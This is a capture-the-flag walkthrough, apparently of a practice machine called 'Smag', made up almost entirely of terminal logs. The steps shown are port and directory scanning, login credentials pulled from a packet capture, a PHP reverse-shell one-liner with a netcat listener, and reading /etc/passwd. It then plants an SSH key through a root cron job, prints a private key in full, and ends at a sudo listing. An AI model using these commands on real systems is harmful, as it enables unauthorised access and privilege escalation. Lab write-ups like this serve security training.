# nmap
```
root@kali:~# nmap -sV -sC -T5 -p- 10.10.208.223
Starting Nmap 7.80 ( https://nmap.org ) at 2020-07-30 14:27 UTC
Nmap scan report for ip-10-10-208-223.eu-west-1.compute.internal (10.10.208.223)
Host is up (0.00076s latency).
Not shown: 65533 closed ports
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0                                     )
| ssh-hostkey:
|   2048 74:e0:e1:b4:05:85:6a:15:68:7e:16:da:f2:c7:6b:ee (RSA)
|   256 bd:43:62:b9:a1:86:51:36:f8:c7:df:f9:0f:63:8f:a3 (ECDSA)
|_  256 f9:e7:da:07:8f:10:af:97:0b:32:87:c9:32:d7:1b:76 (ED25519)
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Smag
MAC Address: 02:12:D8:E8:2B:1A (Unknown)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap                                     .org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 10.75 seconds
root@kali:~#

```

```

root@kali:~# gobuster dir -u http://10.10.208.223 -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt -x php,txt,html,zip
===============================================================
Gobuster v3.0.1
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
===============================================================
[+] Url:            http://10.10.208.223
[+] Threads:        10
[+] Wordlist:       /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt
[+] Status codes:   200,204,301,302,307,401,403
[+] User Agent:     gobuster/3.0.1
[+] Extensions:     txt,html,zip,php
[+] Timeout:        10s
===============================================================
2020/07/30 14:31:21 Starting gobuster
===============================================================
/index.php (Status: 200)
/mail (Status: 301)
```

http://10.10.208.223/mail/
pcap

```
POST /login.php HTTP/1.1
Host: development.smag.thm
User-Agent: curl/7.47.0
Accept: */*
Content-Length: 39
Content-Type: application/x-www-form-urlencoded

username=helpdesk&password=cH4nG3M3_n0wHTTP/1.1 200 OK
Date: Wed, 03 Jun 2020 18:04:07 GMT
Server: Apache/2.4.18 (Ubuntu)
Content-Length: 0
Content-Type: text/html; charset=UTF-8
```

http://development.smag.thm/login.php


```
php -r '$sock=fsockopen("10.10.237.74",1234);exec("/bin/sh -i <&3 >&3 2>&3");'
```

```
root@kali:~# nc -lnvp 1234
listening on [any] 1234 ...
connect to [10.10.237.74] from (UNKNOWN) [10.10.208.223] 40404
/bin/sh: 0: can't access tty; job control turned off
$ whoami
www-data
$ python -c 'import pty; pty.spawn("/bin/bash")'
/bin/sh: 2: python: not found
$ cat /etc/passwd
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
systemd-timesync:x:100:102:systemd Time Synchronization,,,:/run/systemd:/bin/false
systemd-network:x:101:103:systemd Network Management,,,:/run/systemd/netif:/bin/false
systemd-resolve:x:102:104:systemd Resolver,,,:/run/systemd/resolve:/bin/false
systemd-bus-proxy:x:103:105:systemd Bus Proxy,,,:/run/systemd:/bin/false
syslog:x:104:108::/home/syslog:/bin/false
_apt:x:105:65534::/nonexistent:/bin/false
messagebus:x:106:110::/var/run/dbus:/bin/false
uuidd:x:107:111::/run/uuidd:/bin/false
jake:x:1000:1000:jake,,,:/home/jake:/bin/bash
sshd:x:108:65534::/var/run/sshd:/usr/sbin/nologin
```


```
$ ./linpeas.sh



SHELL=/bin/sh
PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin

*  *    * * *   root    /bin/cat /opt/.backups/jake_id_rsa.pub.backup > /home/jake/.ssh/authorized_keys

```

```
$ ls
jake_id_rsa.pub.backup
$ ssh-keygen -t rsa
Generating public/private rsa key pair.
Enter file in which to save the key (/var/www/.ssh/id_rsa): /tmp/id_rsa
Enter passphrase (empty for no passphrase):
Enter same passphrase again:
Your identification has been saved in /tmp/id_rsa.
Your public key has been saved in /tmp/id_rsa.pub.
The key fingerprint is:
SHA256:Prh5EfKr8zxh/cSWtXiD7SqgjJM7NiezIgMZnHUQZ6g www-data@smag
The key's randomart image is:
+---[RSA 2048]----+
|   o+o           |
|   oo.           |
|. + .            |
|.E    . .     .  |
| o     oSo . * . |
|o      o* . B =  |
|.    +.oo= + o . |
|o . X =++.. . .  |
| o ooX+=o. ...   |
+----[SHA256]-----+
$ ls /tmp
VMwareDnD
id_rsa
id_rsa.pub
linpeas.sh
systemd-private-6dc6d738558244fb80240046837682b4-systemd-timesyncd.service-rTwb6B
$ ls
jake_id_rsa.pub.backup
$ cp /tmp/id_rsa.pub jake_id_rsa.pub.backup
$ ls -al
total 12
drwxr-xr-x 2 root root 4096 Jun  4 15:49 .
drwxr-xr-x 3 root root 4096 Jun  4 15:37 ..
-rw-rw-rw- 1 root root  395 Jul 30 08:10 jake_id_rsa.pub.backup
$ cat jake_id_rsa.pub.backup
ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDNhKRe+VXDAlR7x9QiYxpTfj6CfutqyAUopQFSO8l/uYR4FQRgqI0puFY0pcLkj5VFF7eKVDWnSEYAfarzAyE6agUluyl0rqj+SbihJoXHXDGh8c/boLxwombRaKHP6I+w7Gvf7FvlvW1kR+gHrud6x8h+rHM7GD6vIHiZRI7MttL9/2quC4M2UWUX/j+sDb2n21xMhlfnuSXWBw9yMyl5Cmqadw7RsU8Yn7Kd+HeHz/yWX3jP/9SurytZIQXg/3KZQIcmpED/EuYsu47aOmoiXJj8D9DH7nhkMAV4Yoj9Jfqvmbm6OFCO+VzTPZUJSDXcR2Q/E6JnuXkvxd/WPZyl www-data@smag
$ cat id_rsa
cat: id_rsa: No such file or directory
$ cat /tmp/id_rsa
-----BEGIN RSA PRIVATE KEY-----
MIIEogIBAAKCAQEAzYSkXvlVwwJUe8fUImMaU34+gn7rasgFKKUBUjvJf7mEeBUE
YKiNKbhWNKXC5I+VRRe3ilQ1p0hGAH2q8wMhOmoFJbspdK6o/km4oSaFx1wxofHP
26C8cKJm0Wihz+iPsOxr3+xb5b1tZEfoB67nesfIfqxzOxg+ryB4mUSOzLbS/f9q
rguDNlFlF/4/rA29p9tcTIZX57kl1gcPcjMpeQpqmncO0bFPGJ+ynfh3h8/8ll94
z//Urq8rWSEF4P9ymUCHJqRA/xLmLLuO2jpqIlyY/A/Qx+54ZDAFeGKI/SX6r5m5
ujhQjvlc0z2VCUg13EdkPxOiZ7l5L8Xf1j2cpQIDAQABAoIBAHisRpthicLcTmDz
35JlYGLgALI89dwYIDdSU6lGY7U0aBzeMljS/zgc/bkiD4KG8F3GZEW71lkn7bqC
D2trTgpvkCAselYB7EaLYPZ2mRyK/LWbN7I8+gikwvx4lHJwmlaHK3wq23bVODMm
qY5BW7fTMN14QpzTSpMn3MgZ4kM+lMuphb3huKZz7aWMVXXCr3AKcPFR8GJxtrBm
8ghTrHDChC3B1oNwRbmxS9f+QHeFy9pxkXheQAA250waY8qUVE+5+uTx/+6Hr2Uw
2pofc9VHD2A0vprR94+KdH8L0F5wkkSLmJARKkIe0XCHrwIXG16KPRVFFH9oyQLt
AWoGZq0CgYEA6qdfel8LW+Ow9HXhh5Kq02EKEqXGnQmgNn08b2Hy6ktNrq3Tst8Q
szk4wNn1KVrvxFfwaCcdShhV+9YCYWVaZ7eChqk+1Xq91mIaOV2szYyo9lLSZSBm
1hxDiX59UUj96bZspKDl7cQemzxiKv6uPi3IqgthwpdyGaCMglPsJ9cCgYEA4DbB
q+kBiKgCaaNeoiUUrBU+L01HSTYf2J0wjdOpJaZNn0hwDWDZgfzMyutE+9gDWz3m
Gen4MXcsvhrNRKidnm/Vd+Dkx2Euq3ovVfWC0JH7zH9rsNumPy4Qm5so6Xr6PrI0
6yLnRr41FPpMwhqUjkyygCrpidTp7ypG40eu3+MCgYAV3MY+hoBubUZdYGZE1Vtp
Gk9v8VYR54WvzfdFgWC6h42TSsrAjZvmttwcy7HVyo0wQ+k4KvzFnILWVdge7ux/
YU+d8ELUbP0m7jj3Q00IUaSkXo8PsPcj17pLIyfV3PEbR03UANGrV2xqljOnQddG
H8nkXe8bzDRrQtQUiHEmPQKBgG9sptjBBeMc434OE0RvOxO9xtaJCAkpHbBvhaal
7mRofiDPRehQHifMMxYQz4p8skZQv55XOOGUQScEeMhLJ3GKUEKv/+HZuPC82vNT
/DucoM7i7+jHb5nsUZKTDETjuaMYutWz1c3BTu3q6eR4gyUolni9WqwFpHAXyXy/
rfdTAoGARz/K/6nn7MZFLlD0UBXjIoXTB6QaGSRbU96LU6V0ayQuotUhm7nGte79
GYwym6tknyxNh7LX5vufTXjP+FgibRDG3nz15WWtWK+d4KygoiacOpKMIzIK20Dl
yt3Aa5fXbhWa3oX+QfH1S+u3LBdGs0T3GeRRXELwXxWOrsGFIus=
-----END RSA PRIVATE KEY-----

```

```
root@kali:~# vi id_rsa
root@kali:~# chmod 600 id_rsa
root@kali:~# ssh -i id_rsa jake@10.10.208.223
Welcome to Ubuntu 16.04.6 LTS (GNU/Linux 4.4.0-142-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

Last login: Fri Jun  5 10:15:15 2020
jake@smag:~$ ls
user.txt
jake@smag:~$ cat user.txt
XXXXXXXXXXXXXXXXXXX
```


```
jake@smag:~$ sudo -l
Matching Defaults entries for jake on smag:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User jake may run the following commands on smag:
    (ALL : ALL) NOPASSWD: /usr/bin/apt-get
```


